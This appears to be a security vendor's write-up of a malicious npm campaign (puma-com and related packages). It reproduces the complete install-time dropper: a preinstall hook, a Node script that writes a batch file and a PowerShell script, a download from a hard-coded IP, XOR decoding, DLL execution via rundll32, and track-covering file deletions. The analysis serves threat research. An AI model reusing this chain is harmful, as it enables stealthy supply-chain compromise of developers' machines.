@@ -1,0 +1,136 @@
+
+On October 30, 2023 Phylum’s automated risk detection platform alerted us to a strange publication to npm called puma-com. Upon investigation, we found a very convoluted attack chain that ultimately pulled a remote file, manipulated it in place, called an exported function from that file, and then meticulously covered its tracks by removing and renaming files all along the way. Since then we’ve been tracking four additional packages belonging to this campaign as well. We are currently reverse engineering the DLL, but it hits on 20 vendors on VirusTotal so we’re sure it’s up to no good. Join us as we unravel this convoluted attack.
+Background
+What’s clever about this attack is that if you install this package and then go take a look at its contents you won’t see any malware. That’s because the installation of the package itself triggers not only the malware deployment, but also an extensive evidence remediation effort to completely remove any trace of the malware or its deployment mechanisms. So we need to start this investigation by manually downloading the tgz archive from npm.
+The Attack Chain
+We’ll start by looking into the package.json in the archive, because when you do an npm install <package> any install scripts are defined here:
+...
+"scripts": {
+    "preinstall": "node index.js && del index.js",
+    "dts-check": "tsc --project tests/types/tsconfig.json",
+    "lint": "standard",
+    "lint-readme": "standard-markdown",
+    "pretest": "npm run lint && npm run dts-check",
+    "test": "tap tests/*.js --100 -Rspec",
+    "prerelease": "npm test",
+    "release": "standard-version"
+...
+And sure enough, we can see a preinstall script defined: "preinstall": "node index.js && del index.js" which immediately executes index.js and then deletes it. Seems suspicious, so let’s go take a look there:
+const os = require('os');
+const fs = require('fs');
+const { exec } = require('child_process');
+// Get the operating system type
+const osType = os.type();
+
+const data = '@echo off\\ncurl -o sqlite.a -L "<http://103.179.142.171/npm/npm.mov>" > nul 2>&1\\nstart /b /wait powershell.exe -ExecutionPolicy Bypass -File preinstall.ps1 > nul 2>&1\\ndel "preinstall.ps1" > nul 2>&1\\nif exist "preinstall.db" (\\ndel "preinstall.db" > nul 2>&1\\n)\\nrename sql.tmp preinstall.db > nul 2>&1\\nrundll32 preinstall.db,CalculateSum 4906\\ndel "preinstall.db"\\nif exist "pk.json" (\\ndel "package.json" > nul 2>&1\\nrename "pk.json" "package.json" > nul 2>&1\\n)';
+const psdata = '$path1 = Join-Path $PWD "sqlite.a"\\n$path2 = Join-Path $PWD "sql.tmp"\\nif ([System.IO.File]::Exists($path1))\\n{\\n$bytes = [System.IO.File]::ReadAllBytes($path1)\\nfor($i = 0; $i -lt $bytes.count ; $i++)\\n{\\n$bytes[$i] = $bytes[$i] -bxor 0xef\\n}\\n[System.IO.File]::WriteAllBytes($path2, $bytes)\\nRemove-Item -Path $path1 -Force\\n}';
+
+if (osType === 'Windows_NT') {
+  // The system is running Windows
+  const fileName = 'preinstall.bat'; // Specify the file name
+  const psfileName = 'preinstall.ps1';
+  // Create the file
+  fs.writeFile(fileName, data, (err) => {
+    if (!err) {
+	    fs.writeFile(psfileName, psdata, (err) => {
+    		if (!err) {
+          // Execute the .bat file
+          const child = exec(`"${fileName}"`, (error, stdout, stderr) => {
+          if (error) {
+            return;
+          }
+          if (stderr) {
+            return;
+          }
+          fs.unlink(fileName, (err) => {
+          });
+          });
+
+        }
+      });
+    }
+  });
+}
+We’ll step through this slowly because there’s a lot going on. First, we see some imports defined and then two long strings are stored in data and psdata. A careful observer will notice that the string in data looks a lot like a batch file and the string in psdata looks a lot like a PowerShell script.
+Then we step into a branch that is only executed if we’re on a Windows machine, so Windows users are clearly the target here. Assuming we are on Windows, they write the contents data into a file called preinstall.bat and the contents of psdata into a file called preinstall.ps1. This confirms our earlier suspicion that those strings were, in fact, source code. Then after writing the files the preinstall.bat file is executed. So let’s go look in preinstall.bat.
+@echo off
+curl -o sqlite.a -L "<http://103.179.142.171/npm/npm.mov>" > nul 2>&1
+start /b /wait powershell.exe -ExecutionPolicy Bypass -File preinstall.ps1 > nul 2>&1
+del "preinstall.ps1" > nul 2>&1
+if exist "preinstall.db" (
+    del "preinstall.db" > nul 2>&1
+)
+rename sql.tmp preinstall.db > nul 2>&1
+rundll32 preinstall.db,CalculateSum 4906
+del "preinstall.db"
+if exist "pk.json" (
+    del "package.json" > nul 2>&1
+rename "pk.json" "package.json" > nul 2>&1
+)
+First, it uses curl to download a file named npm.mov from a hard-coded IP address and saves it to a local file named sqlite.a, silencing all output by redirecting to nul. It then uses powershell.exe to execute the preinstall.ps1 script from earlier. Notice that it sets the execution policy to Bypass to avoid restrictions on running scripts and it also uses the \\wait flag to wait until the PowerShell script finishes before continuing. To follow the execution path, let’s jump out of the batch file and go take a look in the PowerShell script:
+$path1 = Join-Path $PWD "sqlite.a"
+$path2 = Join-Path $PWD "sql.tmp"
+if ([System.IO.File]::Exists($path1))
+{
+    $bytes = [System.IO.File]::ReadAllBytes($path1)
+for($i = 0; $i -lt $bytes.count ; $i++)
+{
+    $bytes[$i] = $bytes[$i] -bxor 0xef
+}
+[System.IO.File]::WriteAllBytes($path2, $bytes)
+Remove-Item -Path $path1 -Force
+}
+This script first defines two paths $path1 and $path2 to files in the present directory called sqlite.a and sql.tmp respectively. If the sqlite.a file exists, which we just pulled from the remote IP a moment ago in the batch file, it read all bytes from it into a variable $bytes. It then iterates over each byte in $bytes performing an in-place bitwise XOR operation with the byte 0xef. This appears to be a kind of minimalistic decryption operation. After modifying each byte in the array $bytes, it then writes the results to the file at $path2 which is sql.tmp. Finally, the original file sqlite.a is forcibly removed from the system.
+And with that we’ll pick back up where we left on in the batch file. Here’s what we have left to execute there:
+del "preinstall.ps1" > nul 2>&1
+if exist "preinstall.db" (
+    del "preinstall.db" > nul 2>&1
+)
+rename sql.tmp preinstall.db > nul 2>&1
+rundll32 preinstall.db,CalculateSum 4906
+del "preinstall.db"
+if exist "pk.json" (
+    del "package.json" > nul 2>&1
+rename "pk.json" "package.json" > nul 2>&1
+)
+Now that they’re done executing the PowerShell script, it’s immediately deleted to clean up the trace of its existence. Then a check is performed to see if a file called preinstall.db already exists, and if so, it’s deleted. Then the decrypted file from earlier is renamed to preinstall.db. Then the native Windows command rundll32 is used to execute a function CalculateSum within the preinstall.db file passing the argument 4096. This means that the file we pulled from the IP (with a .mov extension and saved locally with a .a extension), decrypted, and then renamed with a .db extension is actually a DLL, not a database file as the extension suggests. After running this, it then deletes the DLL file preinstall.db. Finally, it looks for a file called pk.json and if found it deletes a file called package.json and then renames pk.json to package.json. Keep this package.json renaming in mind because we’ll come back to it in just a minute. That concludes execution of the batch file and with that we pop back out into the original package.json file, the final step of which is deleting the preinstall.bat file. And after that, we’re back in the preinstall hook, the last step of which is del index.js, which simply deletes the index.js file that contained the second stage of malware.
+Now, back to the package.json renaming bit. We know that if pk.json is found (and we can see that it does exists in the archive), package.json is removed and pk.json is renamed to that. If we compare pk.json and package.json we’ll notice that they are identical except for one line: the preinstall script has been removed from pk.json. And if we remember, this entire attack chain started from the preinstall hook of the package.json file! In other words, if you install this package and then go inspect its contents, you’ll see a benign package.json file without any install hook. You also would not find the index.js file that was responsible for creating the batch file and PowerShell scripts. And remember that during the execution of those, all intermediate files were deleted as well so it’d look like a completely benign package without any evidence of maliciousness.
+Maintainer timeline and GitHub repositories
+Of the five packages we’ve found that have this misbehavior, four are still available on npm- puma-com was unpublished at 2023-11-01T18:13:45.046. Each of the four packages is listed under a different maintainer with a different email address.
+
+Name	Version	Publish Date (UTC)	Maintainer	Email
+puma-com	5.0.3	2023-10-30 01:49:09	troll1234	jacktroll83@gmail.com
+erc20-testenv	5.0.3	2023-10-31 04:28:15	terek1234	terekhovstanislav2@gmail.com
+blockledger	5.0.3	2023-10-31 09:03:03	xxx145465	xxx145465@gmail.com
+cryptotransact	5.0.3	2023-10-31 09:18:57	sandwich1901001	sandwich190100@outlook.com
+chainflow	5.0.3	2023-11-02 11:40:14	troll1234	jacktroll83@gmail.com
+In each package, the package.json file lists the following GitHub repository:
+"repository": {
+                "type": "git",
+                "url": "git+https://github.com/jhonnpmdev/config-envi.git"
+            }
+This user currently only has one repository, and we find some interesting things in the commit history.
+The initial commit to jhonnpmdev/config-env occurred on 20 Sep 2023, and there we see the package.json and pk.json files as mentioned above. But, in pk.json we find a different GitHub repository:
+"repository": {
+    "type": "git",
+    "url": "<https://github.com/johnsoncolin99325/dev-config.git>"
+  }
+Pulling the thread further, that GitHub repository bears a striking resemblance to jhonnpmdev/config-env and its first commit was 11 Sep 2023. Looking in the same package.json in the initial commit, we find:
+"repository": {
+    "type": "git",
+    "url": "git://github.com/motdotla/dotenv.git"
+  }
+and this appears to be the legitimate repository that this actor used to start his malicious packages with.  One of the first commits that this actor made was to change the original version tag with his own, along with the original package name.
+The actor went through several iterations of development in the dev-config repo making modest changes until this early prototype was completed and published on 14 Sep 2023 under the name dot-environment v.1.1.0.  Most notably, the resource that the malware called out to was found at hxxp://91.206.178.125/files/npm.mov a Polish IP address.
+It survived nearly a week on npm until it was taken down on 20 Sep 2023, which is the same day that the initial commit to the jhonnpmdev/config-envi repo on GitHub occurred. The actor made a few more minor modifications to this repo on GitHub over the course of a couple of weeks, including changing the endpoint where the malware came from - hxxp://103.179.142.171/files/npm.mov
+It is unclear at the moment why this version languished on GitHub for most of October until puma-com was published on npm on 30 Oct 2023, but it does demonstrate that this actor has some perseverance to publish this malware.
+Conclusion
+As mentioned previously, we’re currently working through reversing the DLL and will report back when we learn exactly what it’s doing. Based on the naming choices of the packages belonging to this campaign, however, we suspect it will have something to do with blockchain or cryptocurrency. Regardless, it’s further proof of the ever-increasing sophistication of threat actors in our open-source ecosystems. This particular attack focused on very carefully covering their tracks after deploying their malware, going so far as restoring the package to a benign state after execution.
+Publication Timeline
+
+Name	Version	Publish Date (UTC)
+puma-com	5.0.3	2023-10-30 01:49:09
+erc20-testenv	5.0.3	2023-10-31 04:28:15
+blockledger	5.0.3	2023-10-31 09:03:03
+cryptotransact	5.0.3	2023-10-31 09:18:57
+chainflow	5.0.3	2023-11-02 11:40:14
